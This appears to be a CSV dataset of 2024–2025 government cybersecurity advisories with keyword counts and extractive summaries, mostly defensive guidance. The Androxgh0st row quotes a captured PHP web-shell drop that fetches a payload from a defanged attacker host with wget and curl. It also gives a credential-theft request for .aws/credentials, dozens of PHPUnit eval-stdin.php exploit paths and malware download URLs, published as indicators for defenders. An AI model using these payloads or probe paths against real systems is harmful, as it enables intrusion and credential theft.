title,date,quarter,keyword_counts,summary
SVR Cyber Actors Adapt Tactics for Initial Cloud Access,2024-02-26,1,{'phishing': 1},All material is UK Crown Copyright ©  enrolment is required then use a strong form of 2SV that is resistant to  phishing and prompt bombing.
Top Cyber Actions for Securing Water Systems,2024-02-21,1,"{'phishing': 1, 'ransomware': 1, 'threats_of_violence': 3}","Also see CISA's Secure our World  Campaign: Employee Phishing Training for practical steps to help your employees avoid phishing scams. •  Free resources: CISA’s Cyber Essentials Toolkit Chapter 5: Your Data and NIST’s Protecting Data From  Ransomware and Other Data Loss Events provide guidance on backing up your systems. Assessments enable you to identify, assess, and prioritize threats to vulnerabilities in both OT and IT networks. WWS Facilities  3 Joint FBI-CISA-EPA-NSA Cybersecurity Advisory: Ongoing Cyber Threats to U.S. Review CISA’s Secure by Design  guidance and ask your vendors  how they are adopting the  secure by design principles and  tactics within their products to  mitigate cybersecurity threats."
Identification and Disruption of the Warzone Remote Access Trojan (RAT),2024-02-15,1,"{'phishing': 7, 'extortion': 1, 'threats_of_violence': 1, 'malware': 14}","Overview  The Warzone RAT, also identified as Ave Maria due to variations of the text “Ave_Maria”  appearing in the code, was used in nation-state attack campaigns, spam or phishing campaigns  by cyber criminals, and as a precursor to follow-on exfiltration and extortion attacks. Malicious files generated by the exploit builders were  typically delivered via phishing email. Spearphishing Campaign   Campaign attempting to compromise  government employees and military personnel  of India’s National Informatics Centre (NIC). Phishing Campaign   Phishing campaign spoofing official Hungarian  government employee communications  Sandworm (Russian APT)   Cyber espionage attack(s) against Ukrainian  telecommunication providers. APT-C-36 Campaign   Phishing email campaign targeting various  entities in South America. Distribution    Warzone RAT was primarily distributed as a malicious attachment in an email (T1566), either  through broad malware spam (malspam) campaigns or targeted phishing attempts. Table 2:  Warzone RAT ATT&CK Techniques for Enterprise – Initial Access  Technique Title  ID  Use  Phishing: Spearphishing  Attachment  T1566.001  Warzone RAT has been distributed as a  malicious attachment within an email. FLASH Number  The following information is being provided by the FBI, with no guarantees or warranties, for potential  use at the sole discretion of recipients to protect against cyber threats. TLP: CLEAR  TLP: CLEAR  15 February 2024  MU-000174-MW    Identification and Disruption of the Warzone Remote  Access Trojan (RAT)      Summary  The Federal Bureau of Investigation (FBI) is releasing this FLASH to disseminate indicators of  compromise (IOCs) and tactics, techniques, and procedures (TTPs) associated with the Warzone  Remote Access Trojan (RAT), also identified as “Ave Maria” through open-source reporting and  FBI investigation. Beginning in October 2018, the Warzone service offered a malware-as-a-service (MaaS) remote  access trojan, along with other malware products and attracted a customer database of over  7,000 users. The Warzone service offered multiple associated malware products, including a premium RAT  called “Poison” with advanced features such as a rootkit to hide processes, files, and startup;  premium customer support; and premium Dynamic Domain Name System (DDnS) services. The Microsoft  exploits, which allowed malware to be embedded into a .doc or Excel file, exploited the  reported Common Vulnerabilities and Exposures (CVEs), in particular CVE-2017-8570, CVE- 2017-11882, and CVE-2018-0802. The  malware was often also distributed with or through malicious Microsoft Office files (T1221),  which exploit Microsoft CVE-2017-11882, a CVE that has been in multiple Top Routinely  Exploited Vulnerabilities reports coauthored by the Cybersecurity and Infrastructure Security  Agency’s (CISA), the FBI, the NSA and FVEY partners. Persistence       During installation, the malware gains persistence by copying itself to  C:\Users\User\AppData\Roaming\ and creating a registry key with a value set to the location of  Warzone’s executable binary to enable automatic execution of the code after each machine  reboot. Communication      The malware communicates with C2 servers via TCP over a configurable port which defaults to  port 5200. Variations in the C2  communications could be attributable to the progressive versions of the malware sold by the  developers. After decrypting the communication and connecting with the C2 server, the  malware collects basic system information about the compromised host, such as PC name and  operating system, and sends it back to the C2 server. Indicators of Compromise  The following are strings that can be used to identify and detect unpacked Warzone payload  inside memory:     •  “warzone160\x00”   o Encryption password/key for communication with C2 server   •  “Ave_Maria Stealer”   o String in the binary code of the RAT   •  “nevergonnagiveyouup”   o Encryption password/key for communication with C2 server      The following are other embedded communication passwords identified through the FBI’s  analysis of data associated with the malware:   •  “warzoneTURBO”  •  “MushroomFunguy”  •  “doghoroscopes”           Recommended Mitigations:  The FBI recommends network defenders apply the following mitigations to limit potential  adversarial use of common system and network discovery techniques and to reduce the risk of  compromise:  Preparing for Cyber Incidents:  • Maintain offline backups of data, and regularly maintain backup and restoration. Protective Controls and Architecture:  • Segment networks to prevent the spread of malware or actor traversal. Network  segmentation can help prevent the spread of malware by controlling traffic flows  between, and access to, various subnetworks and by restricting adversary lateral  movement. To aid in detecting malware and actor activity,  implement a tool that logs and reports all network traffic, including lateral  movement activity on a network."
"Risk Management for Electronic Ballot Delivery, Marking, and Return",2024-02-14,1,"{'phishing': 1, 'threats_of_violence': 1, 'malware': 4}","Use encryption where possible (e.g., implement STARTTLS on your email servers to create a secure connection,  encrypt attached files, etc.)  Implement Domain-based Message Authentication, Reporting and Conformance (DMARC) to help identify  phishing emails. Voters  using personal devices increase the potential for an electronic ballot delivery and return system to be  exposed to security threats. Furthermore, email is  often used in cyberattacks on organizations, such as attackers sending messages with malicious links or attachments  to infect computers with malware. This malware could spread to other machines on the network if strong network  segmentation techniques are not used. Utilize anti-malware detection and encourage voters to as well. Make sure to update the anti-malware regularly."
Joint Guidance: Identifying and Mitigating Living Off the Land Techniques,2024-02-07,1,"{'phishing': 3, 'threats_of_violence': 7, 'malware': 1}","• Enabling phishing-resistant MFA as a default feature. Enforce phishing-resistant multi-factor authentication (MFA) across all systems,  especially for privileged accounts. • Mandate MFA, ideally phishing-resistant MFA, for privileged users and make MFA a default, rather than opt-in, feature. Identify and  prioritize essential IP ranges for organizational operations, apply selective  restrictions on others, and routinely review and update allowlists for adaptability  and security against emerging threats. This dynamic can cause system administrators to prioritize Windows   TLP:CLEAR        10 TLP:CLEAR  over macOS when hunting threats. Configure  These recommendations are not foolproof  but are part of a multi-faceted and  comprehensive approach to mitigating  LOTL cyber threats. Leverage user and entity behavior analytics (UEBA) to analyze and correlate activities  across multiple data sources, to identify potential security incidents that may be  missed by traditional tools, and to profile and monitor user behavior, detecting  insider threats or compromised accounts. When  configuration is necessary, the default option should be broadly secure against  common threats. CLI tools can be  misused for unauthorized activities on cloud resources, including data exfiltration  and establishing persistent threats. CLI tools can  be misused for unauthorized activities on cloud resources, including data exfiltration  and establishing persistent threats. • Bypassing Gatekeeper for malware execution: Cyber threat actors may bypass Gatekeeper by leveraging trusted developer certificates or modifying system settings to allow execution from unidentified developers."
State-Sponsored Actors Compromise and Maintain Persistent Access to U.S. Critical Infrastructure,2024-02-07,1,"{'phishing': 3, 'business_email_compromise': 1, 'ransomware': 1, 'threats_of_violence': 4, 'botnet': 6, 'malware': 7}","• Implement phishing-resistant MFA. Secure Accounts  •  Implement phishing-resistant MFA for access to assets [CPG 2H]. •  Implement periodic training for all employees and contractors that covers basic  security concepts (such as phishing, business email compromise, basic operational security,  password security, etc.), as well as fostering an internal culture of security and cyber  awareness [CPG 2I]. •  Harden SMBv3 by implementing guidance included in joint #StopRansomware Guide (see  page 8 of the guide). This  advisory provides guidance for a multifaceted cybersecurity strategy that enables behavior analytics,  anomaly detection, and proactive hunting, which are part of a comprehensive approach to mitigating  cyber threats that employ LOTL techniques. CISA and NIST based  the CPGs on existing cybersecurity frameworks  and guidance to protect against the most  common and impactful threats, tactics,  techniques, and procedures. •  Document a list of threats and cyber actor TTPs relevant to your organization (e.g.,  based on industry or sectors), and maintain the ability (such as via rules, alerting, or  commercial prevention and detection systems) to detect instances of those key threats [CPG  3A]. o Tailor the training to network IT personnel/administrators and other key staff based  on relevant organizational cyber threats and TTPs, such as Volt Typhoon. Government Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical  Infrastructure. Recently, Volt Typhoon actors used Cisco and NETGEAR end-of- life SOHO routers implanted with KV Botnet malware to support their operations [T1584.005]. Government Disrupts Botnet People’s Republic of China Used to Conceal  Hacking of Critical Infrastructure for more information). Government  Disrupts Botnet People’s Republic of China Used to Conceal Hacking of Critical Infrastructure). TLP:CLEAR  Page 38 of 45  |  Product ID: AA24-038A  TLP:CLEAR Table 6: Volt Typhoon actors ATT&CK Techniques for Enterprise – Resource Development  Resource Development  Technique Title  ID  Use  Acquire  Infrastructure:  Botnet  T1583.003  Volt Typhoon uses multi-hop proxies for command-and-control  infrastructure. Compromise  Infrastructure:  Botnet  T1584.005  Volt Typhoon used Cisco and NETGEAR end-of-life SOHO  routers implanted with KV Botnet malware to support their  operations. In addition to leveraging stolen account credentials, the actors use LOTL techniques and avoid  leaving malware artifacts on systems that would cause alerts. Execution  Volt Typhoon actors rarely use malware for post-compromise execution. Volt Typhoon actors also obfuscate their malware. See Appendix C  and CISA Malware Analysis Report (MAR)-10448362-1.v1 for more information. Table 4: Volt Typhoon Malicious Files and Associated Hashes  Note: See MAR-10448362-1.v1 for more information on this malware."
Secure by Design Alert: Malicious Cyber Actors Exploiting Insecure SOHO Routers,2024-01-31,1,{'threats_of_violence': 2},"Manufacturers should design, develop, and deliver SOHO routers with security and safety in mind to create product  resiliency against foreseeable threats. These areas include setting default configurations that secure the devices against foreseeable threats."
Incident Response Guide: Water and Wastewater Sector,2024-01-18,1,"{'phishing': 1, 'personal_data_breach': 1, 'ransomware': 5, 'threats_of_violence': 2, 'malware': 6}","• Phishing Attempts: Suspicious emails, messages, or phone calls asking for personal  information or login credentials come into the utility. For  example, data breach notification requirements vary by state. In recent years, various malicious cyber incidents have impacted WWS  including, but not limited to, unauthorized access, and ransomware.3   Cyber threat actors frequently use ransomware against WWS utilities. On internet-facing  operational technology (OT) networks, ransomware can quickly propagate to affect  operations. For example, in July 2021, criminal cyber actors used the ransomware ZuCaNo,  via remote access, to compromise a supervisory control and data acquisition (SCADA)  computer on the OT network of a Maine-based WWS utility. Additionally, in August 2021, malicious cyber  actors used Ghost variant ransomware against a California-based WWS utility. The  ransomware variant resided in the system for about a month before discovery when three  SCADA servers displayed a ransomware message.4  Nation-state cyber actors also have demonstrated an intent to target U.S. “Ongoing Cyber Threats to U.S. Includes an overview of OT and typical system  topologies, identifies common threats and vulnerabilities to these systems, and provides  recommended security countermeasures to mitigate the associated risks. •  Automated Malware  Analysis  •  Code and Media  Analysis           12 TLP:CLEAR  TLP:CLEAR  CISA | FBI | EPA  2.2.1. • Security Software Alerts: The utility’s anti-malware or firewall software sends  warnings. o Automated Malware Analysis. CISA provides in-depth malware reverse  engineering analysis of malware samples. CISA provides findings via detailed  Malware Analysis Reports that explain how submitted malware operated when  executed and detail any associated indicators. With advanced  training in computer intrusions, forensic investigations, and malware analysis, the  CAT can deploy across the country within hours to respond to major incidents."
Cybersecurity Guidance: Chinese-Manufactured UAS,2024-01-18,1,"{'phishing': 1, 'threats_of_violence': 5, 'malware': 1}","•	 Implement phishing-resistant multifactor authentication methods to secure organizational accounts and data.14 •	 Consider integrating cybersecurity and physical security  functions across the organization to achieve a unified  approach to risk management.15 PROCURE  Identify and select the UAS platforms that best meet the operational and security requirements of the  organization. •	 Procure UAS that follows secure-by-design principles to  proactively address vulnerabilities and emerging threats.16 •	 Understand where UAS are manufactured and to what laws  the manufacturer is subject to clarify security standards and  assess supply chain risk. •	 Implement an information technology security education and training awareness schedule focused on current threats  and best practices. An effective training program allows  UAS operators to identify and mitigate risks and respond  effectively to emerging cybersecurity threats.24 OPERATE Ensure proper operational and security policies are followed during operational usage. •	 Verify current software and firmware versions are installed  prior to operational use to minimize emerging threats and  vulnerabilities. cisa.gov Central@cisa.gov @cisa.gov As of January 17, 2024 @CISA.gov @CISACyber 3  Cybersecurity Guidance: Chinese-manufactured UAS  RESOURCES For additional information, please see the following resources:  Unmanned Aircraft Systems: cisa.gov/topics/physical-security/unmanned-aircraft-systems Secure Your Drone: Privacy and Data Protection Guidance: cisa.gov/resources-tools/resources/secure-your-drone-privacy-and-data- protection-guidance Cybersecurity Best Practices for Operating Commercial Unmanned Aircraft Systems (UASs): cisa.gov/resources-tools/resources/ cybersecurity-best-practices-operating-commercial-unmanned-aircraft NIST IT Asset Management: csrc.nist.gov/publications/detail/sp/1800-5/final Protecting Controlled Unclassified Information in Nonfederal Systems and Organizations: csrc.nist.gov/publications/detail/sp/800- 171/rev-2/final CISA Vulnerability Scanning: cisa.gov/resources-tools/services/cisa-vulnerability-scanning Enhanced Security Requirements for Protecting Controlled Unclassified Information: A Supplement to NIST Special Publication 800- 171: csrc.nist.gov/publications/detail/sp/800-172/final Zero Trust Architecture: csrc.nist.gov/publications/detail/sp/800-207/final China Cyber Threat Overview and Advisories: cisa.gov/topics/cyber-threats-and-advisories/advanced-persistent-threats/china Homeland Security Information Network (HSIN): dhs.gov/homeland-security-information-network-hsin Domestic Security Alliance Council (DSAC): dsac.gov/ Defense Innovation Unit (DIU): diu.mil/blue-uas-cleared-list ENDNOTES 1	 Office of the Director of National Intelligence, Annual Threat Assessment of the  U.S. •	 Incorporate UAS and its components into an organizational  cybersecurity framework for Internet of Things (IoT) devices,  subjecting them to the same level of protection and monitoring  as other organizational ICT devices.11 •	 Isolate, air gap, or segment networks to prevent any potential  malware or breach from spreading to the enterprise network."
Known Indicators of Compromise Associated with Androxgh0st Malware,2024-01-16,1,"{'threats_of_violence': 3, 'botnet': 4, 'malware': 12}","To request incident response resources or technical assistance related to these  threats, contact CISA at report@cisa.dhs.gov. CISA and NIST based the CPGs on  existing cybersecurity frameworks and guidance to protect against the most common and impactful  threats, tactics, techniques, and procedures. Timely patching is one of the  most efficient and cost-effective steps an organization can take to minimize its exposure to         FBI | CISA  Page 12 of 13  |  Product ID: AA24-016A  TLP:CLEAR  TLP:CLEAR cybersecurity threats. Multiple, ongoing investigations and trusted third party  reporting yielded the IOCs and TTPs, and provided  information on Androxgh0st malware’s ability to  establish a botnet that can further identify and  compromise vulnerable networks. Overview  Androxgh0st malware has been observed establishing a botnet [T1583.005] for victim identification  and exploitation in target networks. Laravel Framework Targeting  Androxgh0st malware establishes a botnet to scan for websites using the Laravel web application  framework. Table 2: Resource Development  Technique Title  ID  Use  Acquire  Infrastructure:  Botnet  T1583.005  The threat actor establishes a botnet to identify and exploit  victims. Product ID: AA24-016A January 16, 2024 Co-Authored by:  TLP:CLEAR TLP:CLEAR Known Indicators of Compromise Associated  with Androxgh0st Malware  SUMMARY  The Federal Bureau of Investigation (FBI) and the  Cybersecurity and Infrastructure Security Agency (CISA)  are releasing this joint Cybersecurity Advisory (CSA) to  disseminate known indicators of compromise (IOCs) and  tactics, techniques, and procedures (TTPs) associated  with threat actors deploying Androxgh0st malware. According to open source reporting[1], Androxgh0st is a Python- scripted malware [T1059.006] primarily used to target .env files that contain confidential information,  such as credentials [T1552.001] for various high profile applications (i.e., Amazon Web Services  [AWS], Microsoft Office 365, SendGrid, and Twilio from the Laravel web application framework). Androxgh0st malware also supports numerous functions capable of abusing the Simple Mail Transfer  Protocol (SMTP), such as scanning [T1046] and exploiting exposed credentials [T1078] and  application programming interfaces (APIs) [T1114], and web shell deployment [T1505.003]. Targeting the PHPUnit  Androxgh0st malware TTPs commonly involves the use of scripts, conducting scanning [T1595] and  searching for websites with specific vulnerabilities. FBI | CISA  Page 3 of 13  |  Product ID: AA24-016A  TLP:CLEAR  TLP:CLEAR Androxgh0st malware can also access the application key [TA0006] for the Laravel application on the  website. •  /.aws/credentials  •  /aws/credentials  •  /.aws/config  •  /.git  •  /.test  •  /admin  •  /backend  •  /app  •  /current  •  /demo  •  /api  •  /backup  •  /beta  •  /cron  •  /develop  •  /Laravel  •  /laravel/core  •  /gists/cache  •  /test.php  •  /info.php  •  //.env  •  /admin-app/.env%20         FBI | CISA  Page 5 of 13  |  Product ID: AA24-016A  TLP:CLEAR  TLP:CLEAR •  /laravel/.env%20  •  /shared/.env%20  •  /.env.project%20  •  /apps/.env%20  •  /development/.env%20  •  /live_env%20  •  /.env.development%20  Targeted URIs for web-shell drop:  •  /.env/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  //admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  //api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  //backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  //blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  //cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  //demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  //dev/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  //laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  //lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  //lib/phpunit/phpunit/Util/PHP/eval-stdin.php  •  //lib/phpunit/src/Util/PHP/eval-stdin.php  •  //lib/phpunit/Util/PHP/eval-stdin.php  •  //new/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  //old/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  //panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  //phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  //phpunit/phpunit/Util/PHP/eval-stdin.php  •  //phpunit/src/Util/PHP/eval-stdin.php  •  //phpunit/Util/PHP/eval-stdin.php  •  //protected/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  //sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/evalstd in.php  •  //vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  //vendor/phpunit/phpunit/Util/PHP/eval-stdin.php  •  //vendor/phpunit/src/Util/PHP/eval-stdin.php  •  //vendor/phpunit/Util/PHP/eval-stdin.php  •  //wp-content/plugins/cloudflare/vendor/phpunit/phpunit/src/Util/PHP/eval- stdin.php  •  //wp-content/plugins/dzs- videogallery/class_parts/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php         FBI | CISA  Page 6 of 13  |  Product ID: AA24-016A  TLP:CLEAR  TLP:CLEAR •  //wp-content/plugins/jekyll- exporter/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  //wp-content/plugins/mm- plugin/inc/vendors/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  //www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  /admin/ckeditor/plugins/ajaxplorer/phpunit/src/Util/PHP/eval-stdin.php  •  /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  /api/vendor/phpunit/phpunit/src/Util/PHP/Template/eval-stdin.php  •  /lab/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  /laravel_web/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  /laravel52/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  /laravelao/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  /lib/phpunit/phpunit/Util/PHP/eval-stdin.php  •  /lib/phpunit/phpunit/Util/PHP/eval  •  stdin.php%20/lib/phpunit/src/Util/PHP/eval-stdin.php  •  /lib/phpunit/src/Util/PHP/eval-stdin.php  •  /lib/phpunit/Util/PHP/eval-stdin.php  •  /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  /libraries/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  /phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  /phpunit/phpunit/Util/PHP/eval-stdin.php  •  /phpunit/phpunit/Util/PHP/eval- stdin.php%20/phpunit/src/Util/PHP/evalstdin.php  •  /phpunit/src/Util/PHP/eval-stdin.php  •  ./phpunit/Util/PHP/eval-stdin.php  •  /phpunit/Util/PHP/eval-stdin.php%20/lib/phpunit/phpunit/src/Util/PHP/eval- stdin.php  •  /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php.dev  •  /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php  •  /vendor/phpunit/phpunit/Util/PHP/eval- stdin.php%20/vendor/phpunit/src/Util/PHP/eval-stdin.php  •  /vendor/phpunit/src/Util/PHP/eval-stdin.php  •  /vendor/phpunit/Util/PHP/eval-stdin.php  •  /vendor/phpunit/Util/PHP/eval-stdin.php%20  •  /phpunit/phpunit/src/Util/PHP/eval-stdin.php  •  /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php         FBI | CISA  Page 7 of 13  |  Product ID: AA24-016A  TLP:CLEAR  TLP:CLEAR •  /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  An example of attempted credential exfiltration through (honeypot) open proxies:  POST /.aws/credentials HTTP/1.1  host: www.example.com  user-agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like  Gecko) Chrome/81.0.4044.129 Safari/537.36  accept-encoding: gzip, deflate  accept: */*  connection: keep-alive  content-length: 20  content-type: application/x-www-form-urlencoded    0x%5B%5D=androxgh0st  An example of attempted web-shell drop through (honeypot) open proxies:  GET http://www.example.com/lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php  HTTP/1.1  host: www.example.com  user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,  like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.76  accept-encoding: gzip, deflate  accept: */*  connection: keep-alive  x-forwarded-for: 200.172.238.135  content-length: 279    <?php  file_put_contents('evil.php',file_get_contents('hxxps://mc.rockylinux[.]si/seofor ce/triggers/files/evil.txt')); system('wget  hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt -O evil.php;curl  hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt -O evil.php'); ?>  Monikers used instead of Androxgh0st (0x%5B%5D=???):  •  Ridho  •  Aws  •  0x_0x  •  x_X  •  nopebee7  •  SMTPEX  •  evileyes0  •  privangga         FBI | CISA  Page 8 of 13  |  Product ID: AA24-016A  TLP:CLEAR  TLP:CLEAR •  drcrypter  •  errorcool  •  drosteam  •  androxmen  •  crack3rz  •  b4bbyghost  •  0x0day  •  janc0xsec  •  blackb0x  •  0x1331day  •  Graber  Example malware drops through eval-stdin.php:  hxxps://mc.rockylinux[.]si/seoforce/triggers/files/evil.txt  59e90be75e51c86b4b9b69dcede2cf815da5a79f7e05cac27c95ec35294151f4    hxxps://chainventures.co[.]uk/.well-known/aas  dcf8f640dd7cc27d2399cce96b1cf4b75e3b9f2dfdf19cee0a170e5a6d2ce6b6    hxxp://download.asyncfox[.]xyz/download/xmrig.x86_64  23fc51fde90d98daee27499a7ff94065f7ed4ac09c22867ebd9199e025dee066    hxxps://pastebin[.]com/raw/zw0gAmpC  ca45a14d0e88e4aa408a6ac2ee3012bf9994b16b74e3c66b588c7eabaaec4d72    hxxp://raw.githubusercontent[.]com/0x5a455553/MARIJUANA/master/MARIJUANA.php  0df17ad20bf796ed549c240856ac2bf9ceb19f21a8cae2dbd7d99369ecd317ef    hxxp://45.95.147[.]236/tmp.x86_64  6b5846f32d8009e6b54743d6f817f0c3519be6f370a0917bf455d3d114820bbc    hxxp://main.dsn[.]ovh/dns/pwer  bb7070cbede294963328119d1145546c2e26709c5cea1d876d234b991682c0b7    hxxp://tangible-drink.surge[.]sh/configx.txt  de1114a09cbab5ae9c1011ddd11719f15087cc29c8303da2e71d861b0594a1ba  Generic file managers dropped through eval-stdin.php  hxxps://github[.]com/alexantr/filemanager  hxxps://github[.]com/prasathmani/tinyfilemanager             FBI | CISA  Page 9 of 13  |  Product ID: AA24-016A  TLP:CLEAR  TLP:CLEAR MITRE ATT&CK TACTICS AND TECHNIQUES  See Tables 1-10 for all referenced threat actor tactics and techniques in this advisory. Table 4: Execution  Technique Title  ID  Use  Command and  Scripting Interpreter:  Python  T1059.006  The threat actor uses Androxgh0st, a Python-scripted  malware, to target victim files. The FBI and CISA recommend network defenders apply the following mitigations to limit potential  adversarial use of common system and network discovery techniques and to reduce the risk of  compromise by actors using Androxgh0st malware. RESOURCES  •  CISA: Known Exploited Vulnerabilities Catalog  •  CISA, MITRE: Best Practices for MITRE ATT&CK Mapping  •  CISA: Decider Tool  •  NIST: CVE-2017-9841  •  NIST: CVE-2018-15133  •  NIST: CVE-2021-41773  •  CISA: Cross-Sector Cybersecurity Performance Goals  •  CISA: Secure by Design  REFERENCES  [1] Fortinet - FortiGuard Labs: Threat Signal Report: AndroxGh0st Malware Actively Used in the Wild  ACKNOWLEDGEMENTS  Amazon contributed to this CSA."
Creating and maintaining a definitive view of your Operational Technology (OT) Architecture,2025-09-29,3,"{'ransomware': 1, 'threats_of_violence': 8, 'malware': 1}","It is critical that backups are implemented to be  ransomware resistant to protect their availability. 17  Maintaining a definitive view of your Operational Technology (OT) Architecture  Exposure  Exposure refers to the discoverability and accessibility of networked devices within an  organisation, which could make them vulnerable to potential threats. While this is useful, it is less critical  to day-to-day operations; however, it also more exposed to potential threats. When looking at updating in this scenario, you might choose to prioritise updates or  maintenance of the firewall due to its exposure to threats, despite the fact it is less critical to  the OT system. 21  Maintaining a definitive view of your Operational Technology (OT) Architecture  •  a reference to the how the record is maintained in line with existing change management  policies  •  a process for periodic reviews to confirm the necessity of each connection against  associated risks to the OT network and evolving threats  Additional risk assessments should be performed for external connections to assess if connectivity  is required, as well as the security controls implemented. This is especially critical for systems connected to external networks,  where exposure to threats is higher. 23  Maintaining a definitive view of your Operational Technology (OT) Architecture  •  the use of compensating controls on communications, including how these are managed  and maintained  •  legacy protocol use, including reasons why they cannot be migrated to more modern  protocols (and any plans to upgrade the asset out of service)  •  how segmentation, additional monitoring or other complementing controls can manage  this risk when protocol-layer security may not be feasible (such as in low-latency safety  systems)   •  the logging and monitoring of OT protocols within the system, including the protocols  communications structure and flows   •  normal traffic patterns (such as consistent packet sizes or used commands) as this  understanding aids in identifying potential malicious activity on the network; variations in  expected traffic could indicate issues or threats    Summary: For each asset you should have documented in use protocols, along with their  corresponding TCP/UDP ports. 24  Maintaining a definitive view of your Operational Technology (OT) Architecture  Continuous network monitoring and alerting  Maintaining persistent visibility enables you to detect anomalies, identify potential threats, and  respond to incidents before they escalate. This includes using multi- factor authentication, role-based access control (RBAC), and regular access reviews to reduce the  risk of unauthorised access or insider threats. Once  connected, the device can rapidly deliver pre-programmed keystrokes to execute commands,  install malware, or alter system configurations."
